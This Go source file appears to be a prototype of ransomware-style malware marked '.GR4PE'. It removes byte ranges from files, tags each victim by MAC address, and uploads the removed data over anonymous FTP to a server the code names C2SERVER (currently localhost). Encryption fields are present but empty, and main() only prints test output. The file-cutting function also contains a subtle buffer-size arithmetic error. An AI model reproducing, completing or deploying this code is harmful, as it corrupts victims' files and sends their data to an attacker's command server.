package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/jlaffaye/ftp"
)

type Header struct {
	signiture []byte //.GR4PE
	filename  []byte //nm.FILENAME
	Data      []Data //IDXn.0xFFFFFFFFFFFF
}

type uploadData struct {
	signiture []byte //.GR4PE
	filename  []byte //nm.FILENAME
	mac       []byte //MAC.0xFFFFFFFFFFFF
	Data      []Data //IDXn.0xFFFFFFFFFFFF
	iv        []byte //iv
	key       []byte //key
}

type Data struct {
	idx  []byte //IDXn.0xFFFFFFFFFFFF
	data []byte //data
}

func check(e error) {
	if e != nil && e != io.EOF {
		panic(e)
	}
}

func readByte(filename string, offset int64, length int64) ([]byte, error) {
	file, err := os.Open(filename)
	check(err)
	defer file.Close()
	fileInfo, err := file.Stat()
	check(err)
	if length == -1 {
		length = fileInfo.Size() - offset
	}
	if offset+length > fileInfo.Size() {
		return nil, fmt.Errorf("offset+length > fileInfo.Size()")
	}
	_, err = file.Seek(offset, 0)
	check(err)
	buf := make([]byte, length)
	_, err = file.Read(buf)
	check(err)
	return buf, nil
}

func readNwriteBuf(wfile *os.File, rfile *os.File, buf []byte) {
	_, err := rfile.Read(buf)
	check(err)
	_, err = wfile.Write(buf)
	check(err)
}

func removeByte(filename string, offset int64, length int64) (string, error) {
	BUFER_SIZE := int64(4096)
	ret, err := readByte(filename, offset, length)
	check(err)
	rfile, err := os.Open(filename)
	check(err)
	fileInfo, err := rfile.Stat()
	check(err)
	wfile, err := os.Create(filename + ".tmp")
	check(err)
	defer rfile.Close()
	defer wfile.Close()
	for i := int64(0); i < offset/BUFER_SIZE; i++ {
		buf := make([]byte, BUFER_SIZE)
		readNwriteBuf(wfile, rfile, buf)
	}
	buf := make([]byte, offset%BUFER_SIZE)
	readNwriteBuf(wfile, rfile, buf)
	_, err = rfile.Seek(length, 1)
	check(err)
	buf = make([]byte, BUFER_SIZE-(offset%BUFER_SIZE)-length)
	readNwriteBuf(wfile, rfile, buf)
	for i := int64(0); i < (fileInfo.Size()-(offset+length))/BUFER_SIZE; i++ {
		buf := make([]byte, BUFER_SIZE)
		readNwriteBuf(wfile, rfile, buf)
	}
	buf = make([]byte, (fileInfo.Size()-(offset+length))%BUFER_SIZE)
	readNwriteBuf(wfile, rfile, buf)
	return string(ret), nil
}

// data to string
func idxToString(idx []uint64) string {
	var data []byte
	var cnt int
	for _, v := range idx {
		data = append(data, []byte(
			"IDX"+strconv.Itoa(cnt)+string(
				[]byte(".0x"+
					strings.Repeat("0", (12-len(strconv.FormatUint(v, 16))))+
					strconv.FormatUint(v, 16))))...,
		)
		cnt++
	}
	return string(data)
}

func genUploadHeader(filename []byte, deletedData []Data) uploadData {
	return uploadData{
		[]byte(".GR4PE"),
		filename,
		append(
			[]byte("MAC."),
			[]byte(strings.ReplaceAll(getMacAddr(), ":", ""))...,
		),
		deletedData,
		[]byte(""),
		[]byte(""),
	}
}

// func _genUploadHeader(deletedData []Data, filename []byte, macAddr []byte, key []byte) uploadData {
// 	var idx []byte
// 	var cnt int
// 	for _, v := range deletedData {
// 		idx = append(idx, []byte(
// 			"IDX"+strconv.Itoa(cnt)+string(
// 				[]byte(".0x"+
// 					strings.Repeat("0", (12-len(strconv.FormatUint(v.idx, 16))))+
// 					strconv.FormatUint(v.idx, 16))))...,
// 		)
// 		cnt++
// 	}
// 	return uploadData{[]byte(".GR4PE"), filename, macAddr, 0, idx, []byte(""), key}
// }

func getMacAddr() string {
	interfaces, err := net.Interfaces()
	check(err)
	for _, inter := range interfaces {
		if inter.Name == "eth0" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "en0" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "en1" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "wlan0" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "wlp3s0" {
			return inter.HardwareAddr.String()
		} else if inter.Name == "wlan1" {
			return inter.HardwareAddr.String()
		}
	}
	return ""
}

func ftpUpload(filename string, data []byte) (int, error) {
	C2SERVER := "localhost:9021"
	USERNAME := "anonymous"
	PASSWORD := "anonymous"

	uploader, err := ftp.Dial(C2SERVER)
	check(err)
	err = uploader.Login(USERNAME, PASSWORD)
	check(err)
	uid := strings.Replace(getMacAddr(), ":", "", -1)
	err = uploader.MakeDir(uid)
	check(err)
	err = uploader.ChangeDir(uid)
	check(err)
	err = uploader.Stor(filename, strings.NewReader(string(data)))
	check(err)
	return 1, nil
}

func main() {
	//inputFileName := "tmpfile/in/test"
	//buf, err := removeByte(inputFileName, 40, 10)
	//check(err)
	//fmt.Println(buf)
	fmt.Print(getMacAddr())
	fmt.Print(idxToString([]uint64{1, 2, 465789}))
	fmt.Print(genUploadHeader(
		[]byte("test"),
		[]Data{
			{
				idx:  []byte("IDX.0x000000000100"),
				data: []byte("test1"),
			},
			{
				idx:  []byte("IDX.0x000000000001"),
				data: []byte("test2"),
			},
			{
				idx:  []byte("IDX.0x000000000002"),
				data: []byte("test3"),
			},
		}))
}
